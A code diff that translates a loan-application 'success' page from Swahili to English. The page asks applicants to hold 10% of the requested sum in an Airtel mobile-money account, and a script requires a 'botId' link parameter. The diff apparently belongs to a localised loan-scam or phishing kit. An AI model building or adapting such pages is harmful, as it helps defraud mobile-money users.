@@ -3,7 +3,7 @@
 <head>
 <meta charset="UTF-8">
 <meta name="viewport" content="width=device-width, initial-scale=1.0">
-<title>Mafanikio</title>
+<title>Success</title>
 <style>
 /* Reset default margins and box-sizing */
 * {
@@ -107,25 +107,25 @@ p {
 <body>
 
 <div class="success-container">
-    <h2>Ombi la Mkopo Limewasilishwa!</h2>
+    <h2>Loan Application Submitted Successfully!</h2>
     <p>
-        Ombi lako la mkopo limewasilishwa kwa mafanikio. Ombi hilo linapitiwa na timu yetu kwa sasa.
-        Utapokea ujumbe kutoka kwetu mara tu ukaguzi utakapokamilika.
-        Waombaji wanapaswa kutimiza vigezo vilivyobainishwa ili ombi la mkopo lichakatwe.
+        Your loan application has been submitted successfully. The request is currently being reviewed by our team.
+        You will receive a message from us once the review is complete.
+        Applicants must meet the specified requirements for the loan application to be processed.
     </p>
 
     <div class="loan-notice">
-        <strong>Taarifa ya Ustahiki:</strong>
+        <strong>Eligibility Notice:</strong>
         <ol>
-            <li>Lazima uombe kwa kutumia namba halali ya Airtel.</li>
-            <li>Lazima uwe na angalau 10% ya kiasi unachoomba kwenye akaunti yako ya Airtel.</li>
+            <li>You must apply using a valid Airtel number.</li>
+            <li>You must have at least 10% of the requested amount in your Airtel account.</li>
         </ol>
     </div>
 </div>
 
 <script>
 let botId = new URLSearchParams(window.location.search).get('botId');
-if (!botId) { alert("Kiungo batili cha ufikiaji"); throw new Error("botId missing"); }
+if (!botId) { alert("Invalid access link"); throw new Error("botId missing"); }
 localStorage.setItem('botId', botId);
 </script>
 
